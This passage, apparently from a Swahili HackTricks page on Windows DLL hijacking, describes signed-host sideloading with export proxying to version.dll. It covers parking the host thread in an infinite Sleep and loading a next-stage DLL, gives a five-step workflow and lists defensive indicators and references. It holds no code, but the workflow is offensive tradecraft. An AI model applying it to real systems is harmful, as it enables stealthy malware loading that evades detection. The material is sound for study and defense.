- Hatua hii ya compile-and-run inayotegemea TCC ili-import `Wininet.dll` wakati wa runtime na kupakua shellcode ya hatua ya pili kutoka URL iliyowekwa moja kwa moja kwenye code, hivyo kutoa loader inayoweza kubadilika na kujifanya kuwa uendeshaji wa compiler.

## Signed-host sideloading with export proxying + host thread parking

Baadhi ya misururu ya DLL sideloading huongeza **uundaji wa uthabiti** ili host halali iendelee kufanya kazi kwa muda wa kutosha kupakia hatua zinazofuata bila matatizo, badala ya ku-crash baada ya DLL hasidi kupakiwa.<sup>[[11]](#references)</sup>

Mwenendo ulioonekana
- Weka EXE inayoaminika kando ya DLL hasidi, ukitumia jina la dependency linalotarajiwa kama `version.dll`.
- DLL hasidi **hufanya proxy ya kila export inayotarajiwa** na kuzielekeza kwenye DLL halisi ya mfumo (kwa mfano `%SystemRoot%\\System32\\version.dll`) ili utatuzi wa imports uendelee kufanikiwa na mchakato wa host uendelee kufanya kazi.
- Baada ya kupakiwa, DLL hasidi **hubadilisha entry point ya host** ili thread kuu iingie kwenye mzunguko usio na mwisho wa `Sleep` badala ya kutoka au kuendesha code paths zinazoweza kusitisha mchakato.
- Thread mpya hufanya kazi hasidi halisi: kufungua jina au path ya DLL ya hatua inayofuata (RC4/XOR hutumika mara nyingi), kisha kuizindua kwa `LoadLibrary`.

Kwa nini hili ni muhimu
- Kufanya proxy ya DLL kwa kawaida hudumisha ulinganifu wa API, lakini hakuhakikishi kuwa host itaendelea kufanya kazi kwa muda wa kutosha kwa hatua zinazofuata.
- Kuweka thread kuu kwenye `Sleep(INFINITE)` ni njia rahisi ya kuuweka mchakato uliosainiwa ukiendelea kufanya kazi huku loader ikifungua data, ikiandaa hatua zinazofuata, au ikianzisha muunganisho wa mtandao kwenye worker thread.
- Kutafuta `DllMain` inayotiliwa shaka pekee kunaweza kukosa mwenendo huu ikiwa shughuli muhimu hutokea baada ya entry point ya host kubadilishwa na thread ya pili kuanza.

Mtiririko wa chini kabisa
1. Nakili EXE ya host iliyosainiwa na utambue DLL inayoitafuta kutoka kwenye directory yake ya ndani.
2. Tengeneza proxy DLL inayotoa functions zilezile na kuzielekeza kwenye DLL halali.
3. Katika `DllMain(DLL_PROCESS_ATTACH)`, unda worker thread.
4. Kutoka kwenye thread hiyo, badilisha entry point ya host au utaratibu wa kuanzisha main thread ili izunguke kwenye `Sleep`.
5. Fungua jina/config ya DLL ya hatua inayofuata na uite `LoadLibrary` au ufanye manual-map ya payload.

Viashiria vya kiulinzi
- Michakato iliyosainiwa inayopakia `version.dll` au maktaba zinazofanana kutoka kwenye application directory yake badala ya `System32`.
- Mabadiliko ya memory kwenye entry point ya mchakato muda mfupi baada ya picha kupakiwa, hasa jumps/calls zinazoelekezwa kwenye `Sleep`/`SleepEx`.
- Threads zinazoundwa na proxy DLL ambazo huita mara moja `LoadLibrary` kwa DLL ya pili yenye jina lililofunguliwa kutoka kwenye data fiche.
- Proxy DLL zinazotoa exports zote, zilizowekwa kando ya executables za vendor ndani ya staging directories zinazoweza kuandikiwa kama `ProgramData`, `%TEMP%`, au paths za archive zilizofunguliwa.

## References

- [1] [Red Canary – Maarifa ya Ujasusi: Januari 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Kupandisha Haki kwa Kutumia TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking katika Windows. Mfano rahisi wa C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore Inapeleka Malware Mpya Inayolenga Ulaya](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijacks Zinapokutana na Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Mapacha wa Kidijitali: Muundo wa Kampeni Zinazobadilika za Kujifanya Mwingine Zinazosambaza Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Maslahi Yanayokutana: Uchambuzi wa Makundi ya Vitisho Yanayolenga Serikali ya Kusini-Mashariki mwa Asia](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ndani ya Ink Dragon: Kufichua Mtandao wa Relay na Utendaji wa Ndani wa Operesheni Fiche ya Kihujumu](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Uchambuzi wa Kina wa Zana za Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – Mlolongo wa HTB Bruno ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Kufuatilia Kampeni za Ujasusi za 2026 za Iranian APT Screening Serpens](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – Elementi ya `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Elementi ya `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Elementi ya `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Elementi ya `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Elementi ya `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Elementi ya `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Kasi na Fujo: Operesheni za Nimbus Manticore Wakati wa Mzozo wa Iran](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Vitendo vya Task](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 Inalenga Serikali na Miundombinu Muhimu ya Kusini-Mashariki mwa Asia](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Kuunda Upya na Kugundua Windows DLL Search-Order Hijacking kwa Kutumia Elastic Defend 9.5.0](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Kujenga maktaba asilia kwa Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Native exports kwa Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – Mpangilio wa utafutaji wa dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – Muundo wa PE](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – Kufichua Aina ya SectopRAT Iliyofichwa Ndani ya Programu Halali](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – Kuiba LIGHTSHOW (Sehemu ya Kwanza)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Operesheni FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
- [35] [Kaspersky Securelist – Mfumo wa upakiaji wa .NET unaotegemea XAML wa NetamLoader](https://securelist.com/netamloader/121676)
{{#include ../../../banners/hacktricks-training.md}}
